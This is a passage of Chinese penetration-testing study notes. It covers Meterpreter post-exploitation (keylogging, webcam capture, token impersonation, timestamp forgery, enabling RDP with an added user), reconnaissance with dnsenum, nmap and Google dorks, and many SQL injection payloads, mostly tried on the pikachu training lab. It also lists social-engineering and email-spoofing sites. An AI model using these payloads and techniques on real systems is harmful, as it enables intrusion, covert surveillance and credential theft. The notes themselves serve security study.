6666 -p 3389 -r 127.0.0.1将靶机的3389转发到本地的6666端口，这样我们访问127.0.0.1时就可以访问靶机。  </li><li>删除端口转发<br>  portfwd delete -l &lt;端口名&gt; -p &lt;端口名&gt; -r &lt;目标主机&gt;  </li><li>在目标主机上搜索文件<br>  search -f *.txt  </li><li>获取用户id<br>getuid</li><li>获取系统信息<br>sysinfo  </li><li>模拟任意用户（taken操作）<br>use incognito：假冒用户takens<br>例子 getuid   查看当前系统id<br>use incognito 伪装<br>list tokens -u 列出目标用户的可用令牌<br>impersonate_token”Machine\user”<br>getuid  </li><li>webcam摄像头命令<br>webcam_list:查看摄像头<br>webcam__snap :通过摄像头拍照<br>webcam_stream:通过摄像头开启视频  </li></ol><p>16.execute执行文件<br>   execute -H -i -f cmd.exe  #创建新进程cmd.exe -H不可见，-i交互<br>17.timestomp伪造时间戳<br>     timestomp C:// -h 查看帮助<br>   timestomp -v C://2.txt 查看文件的时间戳<br>     timestomp C://2.txt -f C://1.txt 将1.txt的时间戳复制给2.txt<br>18.enable_rdp脚本开启3389<br> run post/windows/manage/enable_rdp  #开启远程桌面<br>run post/windows/manage/enable_rdp USERNAME = www2 PASSWORD = 123456 #  添加用户<br>run post/windows/manage/enable_rdp FORWARD = true LPORT = 6662 #将3389端口转发到6662<br>19.键盘记录<br>  keyscan_start ：开始键盘记录<br>  keyscan_dump：到处记录数据<br>  keyscan_stop:结束键盘记录</p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h4 id="步骤1-首先进行漏洞扫描，"><a href="#步骤1-首先进行漏洞扫描，" class="headerlink" title="步骤1.首先进行漏洞扫描，"></a>步骤1.首先进行漏洞扫描，</h4><p>如果无漏洞再进行信息搜集完成渗透。  </p><h4 id="2-子域名探测。"><a href="#2-子域名探测。" class="headerlink" title="2.子域名探测。"></a>2.子域名探测。</h4><p>根据主域名，可以获取二级域名，三级域名…<br>真正的一级域名是由一个合法的字符串+域名后缀组成，所以，lisp.com这种形式的域名才是一级域名，lisp是域名主体，.com是域名后缀，可以是.net也是域名后缀  所谓的二级域名实际就是一个一级域名下面的主机名，顾名思义，它是在一级域名前面加上一个字符串，比如asdx.lisp.com，它可以拥有与根顶级域名同样的功能，并且通过设置，可以拥有和跟顶级域名完全一样的功能<br>主要方法(1)dns域传送漏洞<br>dns传送漏洞原理</p><blockquote><p><a href="https://blog.csdn.net/itest_2016/java/article" target="_blank" rel="noopener">https://blog.csdn.net/itest_2016/java/article</a> details/78057445dnsenum oldboydu.com      </p></blockquote><p>例<code>dnsenum oldboyedu.com -f /dns.txt --dnsserver 114.114.114.114</code><br>说明：dnsenum 的目的是尽可能搜集一个域的信息可查询主机地址，域名服务器，mx record ,在域名服务器上执行axfr请求，通过谷歌脚本得到扩展域名信息（google hacking），提取自域名并查询，计算 C 类地址并执行 whois 查询，执行反向查询，把地址段写入文件。上面一系列操作都是dnsenum执行的  </p><p>-h    查看工具使用帮助</p><p>–dnsserver    <server>    指定域名服务器</p><p>–enum    快捷选项，相当于”–threads 5 -s 15 -w”</p><p>–noreverse    跳过反向查询操作</p><p>–nocolor 无彩色输出</p><p>–private 显示并在”domain_ips.txt”文件结尾保存私有的 ips</p><p>–subfile <file> 写入所有有效的子域名到指定文件</p><p>-t, –timeout <value>    tcp 或者 udp 的连接超时时间，默认为 10s（时间单位：秒）</p><p>–threads <value> 查询线程数</p><p>-v, –verbose    显示所有的进度和错误消息</p><p>-o ,–output <file> 输出选项，将输出信息保存到指定文件</p><p>-e, –exclude    <regexp>    反向查询选项，从反向查询结果中排除与正则表达式相符的 PTR</p><p>记录，在排查无效主机上非常有用</p><p>-w, –whois    在一个 C 段网络地址范围提供whois 查询</p><p>-f dns.txt 指定字典文件，可以换成 dns-big.txt 也可以自定义字典</p><p> <code>dig axfr @axfr @ns5.csc108.com |more</code><br>dig命令是常用的域名查询工具，用来检测域名是否正常<br>参数1 @&lt;服务器地址&gt;：指定进行域名解析的域名服务器；<br>2 -b&lt;ip地址&gt;：当主机具有多个IP地址，指定使用本机的哪个IP地址向域名服务器发送域名查询请求；<br>3 -f&lt;文件名称&gt;：指定dig以批处理的方式运行，指定的文件中保存着需要批处理查询的DNS任务信息；<br>4 -P：指定域名服务器所使用端口号；<br>5 -t&lt;类型&gt;：指定要查询的DNS数据类型；<br>6 -x&lt;IP地址&gt;：执行逆向域名查询；<br>7 -4：使用IPv4；<br>8 -6：使用IPv6；<br>9 -h：显示指令帮助信息。<br> (2) 通过系统域名备案号，再反查备案号相关的域名地址 http:<a href="http://www.beianhao.com" target="_blank" rel="noopener">www.beianhao.com</a><br> (3)ssL证书，通过查询SSL证书，获取域名 <a href="https://myssl.com/ssl.html和https://www.chinassl.net/ssltools/ssl-checker.html" target="_blank" rel="noopener">https://myssl.com/ssl.html和https://www.chinassl.net/ssltools/ssl-checker.html</a><br> (4)google 搜索C段<br>比如在：127.127.127.4 这个 IP 上面有一个网站 127.4 这个服务器上面有网站我们可以想想.. 他几乎没什么漏洞！ 但是在他同C段127.127.127.1<del>127.127.127.255 这 1</del>255 上面也有服务器而且也有网站并且存在漏洞,那么我们就可以来渗透 1~255 任何一个站 之后提权来嗅探得到 127.4 这台服务器的密码 甚至3389 连接的密码后台登录的密码 如果运气好会得到很多的密码，C段就是127.127.127.1-127.127.127.255 B段就是127.127.0.0-127.127.255.255<br>（5）APP提取<br>（6）微信公众号<br>（7）字典枚举<br>参考后面的Burp app抓包<br> （8）公开dns源<br>Rapid7 下 Sonar 项目发布的： <a href="https://scans.io/study/sonar.fdns_v2。DNS" target="_blank" rel="noopener">https://scans.io/study/sonar.fdns_v2。DNS</a> 历史解析：    <a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/</a><br>（9）威胁情报查询<br>华为安全情报 <a href="https://isecurity.huawei.com" target="_blank" rel="noopener">https://isecurity.huawei.com</a> </p><h4 id="google-hack使用语法"><a href="#google-hack使用语法" class="headerlink" title="google hack使用语法"></a>google hack使用语法</h4><p> inurl：用于搜索网页上的url例inurl：file  ，site:baidu.com inurl:login<br>intext：用于搜索网页部分中包含的文字  site:baidu.com intext:管理<br>site：限制搜索范围的域名，即指定网站进行搜索  例：intext:管理<br>filetype：搜索文件的后缀名或扩展名  例filetype:mdb，site:baidu.com filetype:txt<br>intitle：限制搜索的网页标题  site:baidu.com intitle:后台<br>allintitle:搜索所有关键字构成的网页标题<br>link：可以得到一个所有包含了指定url的页面列表  </p><h4 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h4><p>格式：nmap 扫描选项 扫描目标<br>主机发现原理：发送探测包到目标主机，如果收到回复说明主机是开启的。<br>用来扫描哪些服务运行在哪些端口<br>用法<br>-sL: List Scan 列表扫描，仅将指定的目标的 IP 列举出来，不进行主机发现。</p><p>-sn: Ping Scan 只进行主机发现，不进行端口扫描。</p><p>-Pn: 将所有指定的主机视作开启的，跳过主机发现的过程。</p><p>-PS/PA/PU/PY[portlist]: 使用 TCPSYN/ACK 或 SCTP INIT/ECHO 方式进行发现。</p><p>-PE/PP/PM: 使用 ICMP echo, timestamp, and netmask 请求包发现主机。</p><p>-PO[protocollist]: 使用 IP 协议包探测对方主机是否开启。</p><p>-n/-R: -n 表示不进行DNS 解析；-R 表示总是进行 DNS 解析。</p><p>–dns-servers &lt;serv1[,serv2],…&gt;: 指定 DNS 服务器。</p><p>–system-dns: 指定使用系统的 DNS 服务器</p><p>–traceroute: 追踪每个路由节点<br>端口扫描<br>open：端口是开放的。closed：端口是关闭的。<br>filtered：端口被防火墙 IDS/IPS 屏蔽，无法确定其状态。unfiltered：端口没有被屏蔽，但是否开放需要进一步确定。open|filtered：端口是开放的或被屏蔽。<br>closed|filtered ：端口是关闭的或被屏蔽。<br>用法<br>-sS/sT/sA/sW/sM:指定使用 TCP SYN/Connect()/ACK/Window/Maimon scans 的方式来对目标主机进行扫描。<br>-sU: 指定使用 UDP 扫描方式确定目标主机的 UDP 端口状况。<br>-sN/sF/sX: 指定使用 TCP Null, FIN, and Xmas scans 秘密扫描方式来协助探测对方的 TCP 端口状态。<br>–scanflags <flags>: 定制 TCP 包的 flags。<br>-sI &lt;zombiehost[:probeport]&gt;: 指定使用 idle scan 方式来扫描目标主机（前提需要找到合适的 zombie host）<br>-sY/sZ: 使用 SCTP INIT/COOKIE-ECHO 来扫描 SCTP 协议端口的开放的情况。<br>-sO: 使用 IP protocol 扫描确定目标机支持的协议类型。<br>-b <FTP relay host>: 使用 FTP bounce scan 扫描方式  </p><pre><code>例如nmap –sS –sU –T4 –top-ports 300 1.1.1.100参数-sS 表示使用 TCP SYN 方式扫描 TCP 端口；-sU 表示扫描 UDP 端口；-T4 表示时间级别配置 4 级；--top-ports 300 表示扫描最有可能开放的 300 个端口（TCP 和 UDP 分别有300 个端口）。  </code></pre><p>版本侦测<br>    -sV: 指定让 Nmap 进行版本侦测<br>    –version-intensity <level>: 指定版本侦测强度（0-9），默认为 7。数值越高，探测出的服务越准确，但是运行时间会比较长。<br>–version-light: 指定使用轻量侦测方式 (intensity 2)<br>–version-all: 尝试使用所有的 probes 进行侦测 (intensity 9)<br>–version-trace: 显示出详细的版本侦测过程信息。</p><pre><code>例如nmap –sV 10.1.1.100</code></pre><p>os侦测<br>原理：Nmap 使用 TCP/IP 协议栈指纹来识别不同的操作系统和设备。<br>用法：-O: 指定 Nmap 进行 OS 侦测。<br>–osscan-limit: 限制 Nmap 只对确定的主机的进行 OS 探测（至少需确知该主机分别有一个 open 和 closed 的端口）。<br>–osscan-guess: 大胆猜测对方的主机的系统类型。由此准确性会下降不少，但会尽可能多为用户提供潜在的操作系统。<br>    <code>例如nmap -O 10.1.1.100</code>  </p><p>Burp APP抓包<br>1.让安卓手机和电脑连接同一wifi<br>2.查看电脑ip地址<br>3.设置手机代理ip，为局域网地址，端口随便，其他配置默认<br>4.电脑端设置burp site ，点击proxy，options，add和手机一样的ip地址和端口<br>5.在proxy -&gt; intercept下开启intercept is on可进行抓包<br>6.抓https包需要导入burp证书，<font color = red>注意，一个burp对应一个证书，所以如果以前安装过证书是没用的，需要重新安装</font> ，方法 proxy ，options import/export CA，export，选择保存路径，<font color = red>文件后缀名为.cer,因为手机只能安装cer的证书</font><br>7.将证书发送到手机，手机找到下载目录，将文件复制到手机的根目录<br>8.打开手机设置，安全与隐私，更多安全设置，从sd卡安装，找到cer文件，重命名<br>完成，可以进行抓包  </p><h4 id="3-敏感信息搜集"><a href="#3-敏感信息搜集" class="headerlink" title="3.敏感信息搜集"></a>3.敏感信息搜集</h4><h4 id="（1）web源码泄露"><a href="#（1）web源码泄露" class="headerlink" title="（1）web源码泄露"></a>（1）web源码泄露</h4><p>github信息泄露搜索能力比较强<br><a href="https://sec.xiaomi.com/article/37" target="_blank" rel="noopener">https://sec.xiaomi.com/article/37</a><br>信息搜集用到的地址：<br>1.百度网盘 ，<br>社工信息泄露：<a href="https://www.instantcheckmate.com/、http://www.uneihan.com/" target="_blank" rel="noopener">https://www.instantcheckmate.com/、http://www.uneihan.com/</a><br>源码搜索：<a href="https://searchcode.com/、https://gitee.com/、gitcafe.com、code.csdn.net" target="_blank" rel="noopener">https://searchcode.com/、https://gitee.com/、gitcafe.com、code.csdn.net</a><br>钟馗之眼： <a href="https://www.zoomeye.org/" target="_blank" rel="noopener">https://www.zoomeye.org/</a><br>天 眼 查 <a href="https://www.tianyancha.com/" target="_blank" rel="noopener">https://www.tianyancha.com/</a><br>威胁情报：微步在线、 ti.360.cn、 Virustotal  </p><h4 id="2-邮箱信息搜集"><a href="#2-邮箱信息搜集" class="headerlink" title="(2) 邮箱信息搜集"></a>(2) 邮箱信息搜集</h4><p>在邮箱收集领域不得不提一个经典的工具，The Harvester,The Harvester 可用于搜索Google、Bing 和 PGP 服务器的电子邮件、主机以及子域名,因此需要翻墙运行该工具。工具下载地址为：<a href="https://github.com/laramies/theHarvester" target="_blank" rel="noopener">https://github.com/laramies/theHarvester</a>  ，注意安装之前需安装python3.6版本，下载完成之后执行python3 -m pip -r requirements.txt，安装完成</p><h4 id="（3）历史漏洞搜集"><a href="#（3）历史漏洞搜集" class="headerlink" title="（3）历史漏洞搜集"></a>（3）历史漏洞搜集</h4><p>wooyun 历史漏洞库：<a href="http://www.anquan.us/" target="_blank" rel="noopener">http://www.anquan.us/</a><br> 漏洞银行：<a href="https://www.bugbank.cn/" target="_blank" rel="noopener">https://www.bugbank.cn/</a><br>360 补天：<a href="https://www.butian.net/" target="_blank" rel="noopener">https://www.butian.net/</a><br>教育行业漏洞报告平台（Beta）<a href="https://src.edu-info.edu.cn/login/" target="_blank" rel="noopener">https://src.edu-info.edu.cn/login/</a>  </p><h4 id="（4）信息工具搜集"><a href="#（4）信息工具搜集" class="headerlink" title="（4）信息工具搜集"></a>（4）信息工具搜集</h4><p>如：7kbscan、破壳 Web 极速扫描器等</p><h4 id="4-指纹识别，waf，cdn识别"><a href="#4-指纹识别，waf，cdn识别" class="headerlink" title="4.指纹识别，waf，cdn识别"></a>4.指纹识别，waf，cdn识别</h4><p>1、在线识纹识别：<br>组件是网络空间最小单元，Web应用程序、数据库、中间件等都属于组件。指纹是组件上能标识对象类型的一段特征信息，用来在渗透测试信息收集环节中快速识别目标服务。大部分应用组件存在足以说明当前服务名称和版本的特征，识别这些特征获取当前服务信息，也即表明该系统采用那个公司的产品。<br><a href="http://whatweb.bugscaner.com/look/" target="_blank" rel="noopener">http://whatweb.bugscaner.com/look/</a><br><a href="http://www.yunsee.cn/finger.html" target="_blank" rel="noopener">http://www.yunsee.cn/finger.html</a><br>2.waf识别<br>github.com/EnableSecurity/wafw00f<br>3.CDN识别<br><a href="https://raw.githubusercontent.com/3xp10it/mytools/master/xcdn.py" target="_blank" rel="noopener">https://raw.githubusercontent.com/3xp10it/mytools/master/xcdn.py</a>  </p><h4 id="5-资产管理"><a href="#5-资产管理" class="headerlink" title="5.资产管理"></a>5.资产管理</h4><p>有了庞大的域名，接下来就是帮助 SRC 梳理资产了。域名可以先判断存活，活着的继续进行确定 IP 环节。根据 IP 的分布，确定企业的公网网段。这其实是一项不小的工程，精准度比较难以拿捏。不过通过不断实战，肯定可以琢磨出一些东西，所以有人称白帽子可能会比企业的运维更了解资产信息。资产梳理过程中可能需要对相关资产漏洞进行查询、利用、发布等，可能会用到已下相关链接地址：  </p><p><strong>SRC 众测平台</strong> </p><p>国际漏洞提交平台 <a href="https://www.hackerone.com/" target="_blank" rel="noopener">https://www.hackerone.com/</a> BugX<br>区块链漏洞平台 <a href="http://www.bugx.org/" target="_blank" rel="noopener">http://www.bugx.org/</a> Gsrc<br>瓜子 src <a href="https://security.guazi.com/" target="_blank" rel="noopener">https://security.guazi.com/</a><br>区块链安全响应中心 <a href="https://dvpnet.io/" target="_blank" rel="noopener">https://dvpnet.io/</a><br>CNVD 国家信息安全漏洞平台 <a href="http://www.cnvd.org.cn/" target="_blank" rel="noopener">http://www.cnvd.org.cn/</a><br>漏洞银行：<a href="https://www.bugbank.cn/" target="_blank" rel="noopener">https://www.bugbank.cn/</a><br>360 补天：<a href="https://www.butian.net/" target="_blank" rel="noopener">https://www.butian.net/</a><br>教育行业漏洞报告平台（Beta）<a href="https://src.edu-info.edu.cn/login/" target="_blank" rel="noopener">https://src.edu-info.edu.cn/login/</a></p><p><strong>国内平台</strong></p><p>知道创宇 Seebug 漏洞平台 <a href="https://www.seebug.org/" target="_blank" rel="noopener">https://www.seebug.org/</a><br>工控系统行业漏洞平台 <a href="http://ivd.winicssec.com/" target="_blank" rel="noopener">http://ivd.winicssec.com/</a><br>打造中文最大exploit 库 <a href="http://www.expku.com/" target="_blank" rel="noopener">http://www.expku.com/</a><br>为数不多的漏洞管理插件收集平台 <a href="http://www.bugscan.net/source/template/vulns/" target="_blank" rel="noopener">http://www.bugscan.net/source/template/vulns/</a><br>一家管理漏洞收集的平台 <a href="http://www.0daybank.org/" target="_blank" rel="noopener">http://www.0daybank.org/</a></p><p><strong>国外平台</strong></p><p>国际漏洞提交平台 <a href="https://www.hackerone.com/" target="_blank" rel="noopener">https://www.hackerone.com/</a> xss poc <a href="http://xssor.io/" target="_blank" rel="noopener">http://xssor.io/</a><br>oday 漏洞库 <a href="https://www.0day.today/" target="_blank" rel="noopener">https://www.0day.today/</a><br>路由器漏洞库 <a href="http://routerpwn.com/" target="_blank" rel="noopener">http://routerpwn.com/</a> cve<br> 漏洞平台 <a href="http://cve.mitre.org/" target="_blank" rel="noopener">http://cve.mitre.org/</a></p><p><strong>威胁情报</strong></p><p>安全数据交流平台    <a href="https://www.secsilo.com/" target="_blank" rel="noopener">https://www.secsilo.com/</a><br>华为安全情报 <a href="https://isecurity.huawei.com/sec/web/intelligencePortal.do" target="_blank" rel="noopener">https://isecurity.huawei.com/sec/web/intelligencePortal.do</a><br>威胁情报共享平台    <a href="https://www.threatcrowd.org/" target="_blank" rel="noopener">https://www.threatcrowd.org/</a><br>被黑站点统计 <a href="http://www.hacked.com.cn/" target="_blank" rel="noopener">http://www.hacked.com.cn/</a></p><p><strong>社工库</strong></p><p>微信伪造    <a href="http://www.jietuyun.com/" target="_blank" rel="noopener">http://www.jietuyun.com/</a><br>任意邮箱发送    <a href="http://tool.chacuo.net/mailanonymous" target="_blank" rel="noopener">http://tool.chacuo.net/mailanonymous</a> 和 <a href="https://emkei.cz/" target="_blank" rel="noopener">https://emkei.cz/</a><br>临时邮箱 <a href="http://www.yopmail.com/" target="_blank" rel="noopener">http://www.yopmail.com/</a><br>邮箱池群 <a href="http://veryvp.com/" target="_blank" rel="noopener">http://veryvp.com/</a><br>社工库 <a href="http://www.uneihan.com/" target="_blank" rel="noopener">http://www.uneihan.com/</a>  </p><h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><p><strong>ping命令</strong>：默认发送32个字节，四个数据包，通常情况下，如果TTL返回255，则通常为交换机或路由器设备，如果TTL返回128则可能为xp/2000/2003系统，如果TTL返回64，则通常为win7/2008/linux系统<br><strong>端口扫描</strong>:telnet ip+端口  （注意win7以上需要手动开启telnet服务）<br>X-scan匹配winxp，win2000，win2003系统<br><strong>AppScan扫描</strong>，建立扫描过程中要求建立一个scan文件，这是因为软件在扫描过程中可能会出现崩溃等情况，但是之前扫描过程中的记录都保存在该scan文件中，所以我们只需要导入该文件继续扫描即可。<br><strong>AXVS扫描</strong><br>安装完成后出现浏览器不能访问的情况，使用谷歌浏览器<br><strong>webInspect</strong><br>所耗内存较大，尽量将其安装在单独的虚拟机中，分配内存3G以上，系统win7以上，支持.net framework4.5.x和sqlserver2012，开启前需要确保services.msc 检查sql和webinspect全部正确开启以防出现扫描中断，10.3下载和安装需要vpn<br><strong>netsparker扫描器</strong><br> 使用较少<br><strong>WVSS</strong><br><strong>安恒</strong><br><strong>Nessus扫描器</strong><br><strong>Nexpose扫描器</strong>  ，这是个虚拟机，下载之后进行导入虚拟机.ova文件即可，需要的8g的内存<br><strong>启明天镜</strong><br>因为可以免费使用三个月，所以使用三个月以后重新安装虚拟机，或者将虚拟机中系统的时间更改一下即可<br><strong>RSAS</strong><br><strong>Burpsuite</strong> 需安装jdk1.8版本</p><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>以下所有的注入代码均为payload，payload实际上就是攻击代码<br><strong>原理</strong>：程序命令和用户数据之间没有做好分开，攻击者有机会将程序命令当作用户输入的数据提交给web程序，注入产生的原因是接受相关参数未经处理直接带入数据库。<br><strong>步骤1</strong>. 确定程序应用的编程语言和技术，通常考察web页面的页脚，查看错误页面，检查页面源代码，或使用Nessus，AWVS,APPSCAN等工具来进行刺探。<br><strong>步骤2.</strong>确定所有可能的输入方式 HTML表单，HTTP头部，Cookies，AJAX。我们可以求助于web代理，例如Burp<br><strong>步骤3.</strong>查找可以用于注射的用户输入。这个比较难，多留意web应用的错误页面。<br>万能输入，例如输入账号密码登录数据库<br>    <code>yuan  123</code> </p><blockquote><p>数据库中登录为 select * from admin where name = ‘yuan’ and password = ‘123’ </p></blockquote><p>我们使用 </p><blockquote><p>‘ or 1=1– </p></blockquote><p>密码随便输入数据库登录为 </p><blockquote><p>select * from admin where name = ‘’ or 1 = 1 and password = ‘随便’,</p></blockquote><p>其中’表示账号为空 –表示后面所有的数据都被注释，相当于执行 <code>select * from admin</code><br>注入前准备，取消IE浏览器的错误信息设置，因为浏览器默认不返回详细错误信息，只返回500错误。方法，在浏览器internet设置-&gt;高级中-&gt;将显示http友好错误信息的对号取消。<br>判断是否存在sql注入：1.在网址后面加上一个单引号，如果显示异常，说明可能存在漏洞。2.很多时候使用单引号会显示非法字符，这时候我们我们两次分别加上and1=1和and 1=2 ，如果显示不同的页面，则存在sql注入。<br><strong>数字型注入</strong> sql语句 </p><blockquote><p>select * from member where id = 1 or 1 = 1;  </p></blockquote><p><strong>字符型注入</strong> sql语句 </p><blockquote><p>select * from member where username = ‘vince’ or 1=1;</p></blockquote><p>在pikachu平台上输入 vince’ or 1=1#(注意，前面的单引号是与pikachu提供的sql语句前面单引号进行配对，后面的#是注释掉pikachu提供的后面的单引号)<br><strong>搜索型注入</strong> sql语句 </p><blockquote><p>select * from member where username like ‘%v%’ or 1=1;</p></blockquote><p>pikachu平台上输入 %v%’ or 1=1#<br><strong>xx型注入</strong>  sql语句   </p><blockquote><p>select * from member where username = (‘vince’) or 1=1;</p></blockquote><p>在pingkachu平台输入 xx’) or 1=1# 实际上与字符型只是在语法上有区别。</p><h3 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h3><p><font color = red>注意使用搜索型注入</font><br>sql查询语法</p><blockquote><p>select id,email from member where username = ‘kevin’ union select username,pw from member where id=1;</p></blockquote><p>结果是将四个字段全部显示出来，但是字段名只显示主字段名，即id和email。在pikachu中使用v’ union select username,pw from member where id=1#，会出现报错，<strong>因为后面查询的字段要与主字段个数相同</strong>，所以我们需要看一下主查询总共有多少个字段，使用 a’ order by 4#,出现错误，使用a’ order by 3#,没有错误（如果还是错误就一直往下尝试，个数较多使用折半查找法），只是没有查询到。说明主查询总共有三个字段（pikachu默认查询三个字段）。最后我们做查询，</p><blockquote><p>设置payload：a’ union select database(),user(),version()#</p></blockquote><p>可查询数据库信息。或者</p><blockquote><p>v’ union select username,pw,sex from member where id=1#</p></blockquote><p>即可查询到。通过看username，id，email在每次查询时代表不同的意义</p><h3 id="information-schema注入"><a href="#information-schema注入" class="headerlink" title="information_schema注入"></a>information_schema注入</h3><p>属于搜索注入<br>information_schema是mysql自带的数据库，他包含了mysql中所有数据库的信息，所以注入他可以获得大量信息，我们需要获得数据库信息，使用 </p><blockquote><p>v’ union select database(),user(),3# </p></blockquote><p><strong>获取数据库表名</strong>，</p><blockquote><p>u’ union select table_schema,table_name,3 from information_schema.tables where table_schema=’pikachu’#</p></blockquote><p>获取数据库名称username，id，email代表数据库名称，用户权限，email无用。<br><strong>获取pikachu的字段名</strong> </p><blockquote><p>a’ union select table_name,column_name,3 from information_schema.columns where table_name=’users’# </p></blockquote><p>username，id，email分别代表表明，字段名，email无用。<br><strong>获取字段值</strong></p><blockquote><p> c’ union select username,password,3 from users#</p></blockquote><p><font color = red>最后获得密码后是个md5码，在网站<a href="http://www.cmd5.com中将其解析出来即可获取密码。" target="_blank" rel="noopener">www.cmd5.com中将其解析出来即可获取密码。</a></font></p><h3 id="基于函数报错注入"><a href="#基于函数报错注入" class="headerlink" title="基于函数报错注入"></a>基于函数报错注入</h3><p>在mysql中使用指定的函数来制造报错，从而获取信息<br>条件：后台没有屏蔽数据库报错信息，发生错误时输出在前端<br>报错注入分为updatexml注入和extractvalue（）注入<br>  updatexml注入分为1.载荷注入，2.insert注入 3.updata注入 4.delete注入<br><strong>三个常用报错函数</strong>：<br>使用指定函数来制造报错，从报错信息中获取指定信息。<br>1.updatexml函数（XML_document,XPath_string,new_value）：是mysql对xml文档数据进行查询和修改的XPATH函数<br>第一个参数，string格式，是文档对象的名字<br>第二个参数，Xpath格式的字符串<br>第三个参数，替换查找到的数据<br>例如</p><blockquote><p>k’ and updatexml(1,concat(0x7e,(select @@version),0x7e),1)#爆破数据库版本信息，0x7e是符号“~”的16进制  </p></blockquote><blockquote><p>k’ and updatexml(1,concat(0x7e,(select user()),0x7e),1)# 爆破数据库当前用户</p></blockquote><blockquote><p>k’ and updatexml(1,concat(0x7e,(select database()),0x7e),1)#爆破数据库名  </p></blockquote><blockquote><p>k’ and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=’pikachu’ limit 0,1)),0)#爆破数据表，获取表名，，显示第二个数据limit1,1，其中limit限制返回的结果只显示一个，limit后一个数据是起始位置，第二个数字是去取出的数据条数</p></blockquote><blockquote><p>k’ and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=’users’ limit 2,1)),0)# 爆字段名</p></blockquote><blockquote><p>k’ and updatexml(1,concat(0x7e,(select password from users limit 0,1)),0)#爆破密码</p></blockquote><p>2.extractvalue（）：也是mysql对xml文档数据进行查询的XPATH函数<br>3.floor（）：mysql中用来取整的函数。    </p><h3 id="insert注入"><a href="#insert注入" class="headerlink" title="insert注入"></a>insert注入</h3><p><font color= red>注意，insert注入用于用户注册端</font><br>原本是前端界面注册的信息，然后后台直接通过insert命令操作插入数据库。但是现在是后端没有做好防护，在前端输入可以直接拼接到到后端的insert语句，导致insert注入.<font color = red>在用户那里<strong>输入单引号</strong>，密码随便输入，页面会有报错信息，说明存在sql注入漏洞。</font><br>pikachu insert注入中在注册信息oldboy 密码123456后，登录中输入oldboy’ or updatexml(1,concat(0x7e,(命令)),0) or’#<br><strong>爆表名</strong>：oldboy’ or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=’pikachu’ limit 0,1)),0) or’<br><strong>爆列名</strong> ‘ or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=’users’ limit 2,1)),0) or’<br><strong>爆内容</strong> ‘ or updatexml(1,concat(0x7e,(select password from users limit 0,1)),0) or’等同于’ or updatexml(1,concat(0x7e,(select password from users limit 0,1)),0) or’1’=’1’ </p><h3 id="update注入"><a href="#update注入" class="headerlink" title="update注入"></a>update注入</h3><p> 与insert注入大体相同，区别在与update注入用于登录端，insert用于用户注册端。 这个需要在登录之后，在修改个人信息输入框中插入payload。<br>update注入payload： a’ or updatexml(0,concat(0x7e,(database())),0) or’  </p><h3 id="delete注入"><a href="#delete注入" class="headerlink" title="delete注入"></a>delete注入</h3><p>需要进行抓包后修改url，然后在抓取的路径后面写上payload<br>应用于前后端发帖，留言，用户等相关删除操作<br>注入payload ：delete from message where id =56 or updataxml(2,concat(0x7e,(database())),0)  </p><h3 id="http-header注入"><a href="#http-header注入" class="headerlink" title="http header注入"></a>http header注入</h3><p>原理：后端开发人员为了进行验证信息，或者通过http header获取一些信息（逻辑语句需要获得用户登录的信息进行后台处理），比如useragent，accept等字段，开发人员需要获得http header然后进行sql语句处理，此时会出现sql注入。<br>注入方法：在pikachu找到header模块，登录之后使用burp suit进行抓包，找到http header，找到user agent或者其他字段，然后删除里面的内容，输入<strong>单引号</strong>，如果出现错误，说明开发人员使用了该字段进行了sql语句处理，说明存在注入。设置payload： 1’ or updatexml(1,concat(0x7e,database()),0) or’ 进行注入。  </p><h3 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h3><p>原理：后端获取cookie后，开发人员使用cookie信息进行数据库处理，也会出现sql注入。<br>方法：使用burp suit抓包后，删除cookie后面的信息，输入<strong>单引号</strong>如果出现错误，说明后端使用了cookie信息，设置payload ：1’ or updatexml(1,concat(0x7e,database()),0) #  </p><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>这种注入比较复杂。通常是其他注入输入后没有反应，或者重定向。<br><strong>1. boolean型盲注</strong>：在mysql命令行中输入select ascii(substr(database,1,1)) &gt; 数字，判断第一个数据库名中第一个字母ascii码的大小。（substr（string，start，length）函数），输入select length（database（））&lt; 数字，判断表名长度，一直尝试到正确值为止。然后在pikachu平台上输入 a’ and ascii(substr(database,1,1)) = 查找到的数字。就可以查找到第一个数据库字符。<br><strong>2. 时间型盲注</strong>  在基于boolean盲注实现不了的情况下，使用 a’ and if(substr(database(),1,1)=’p’)，sleep(10),null#可判断出数据库名第一个字符是否为p，。<br><strong>3. 宽字节注入</strong> phpini中的magic_quotes_gqc参数设为on时，所有单引号，双引号，null，反斜杠等就会被自动转义，所以此时无法注入，还有其他的函数也有类似的作用。这看上去安全，但是也容易出现漏洞。我们在单引号前面加上%df，则会变成%df&#39; = %df%5c%27=衰’，此时衰就干掉了\会变成就会有单引号了。开始注入  </p><h3 id="二阶sql注入"><a href="#二阶sql注入" class="headerlink" title="二阶sql注入"></a>二阶sql注入</h3><p>太复杂  </p><h3 id="mysql注入拿webshell实战"><a href="#mysql注入拿webshell实战" class="headerlink" title="mysql注入拿webshell实战"></a>mysql注入拿webshell实战</h3><p>参考文件  </p><h3 id="Access数据库注入"><a href="#Access数据库注入" class="headerlink" title="Access数据库注入"></a>Access数据库注入</h3><p>Access也是小众的数据库，远远没有mysql数据库强大。<br>user是数据库的一个内置变量，它是字符型，根据出错信息判断数据库类型，即 在注入点后面写上 and user &gt; 0，根据出错信息判断数据库类型。如果提示Microsoft OLE DB Provider for SQL Server 错误‘80040e21’则可以判断为mysql数据库，如果提示’在将nvarchar值‘xxx’转换成数据类型int时失败’。则说明时access数据库。<br>如果IIS不许返回错误提示，则在注入点后使用查询语句<br>and (select count(<em>) from sysobjects) &gt;=0 和 and (select count(</em>) from msysobjects) &gt;=0,因为access存在msyobjects表，而sql 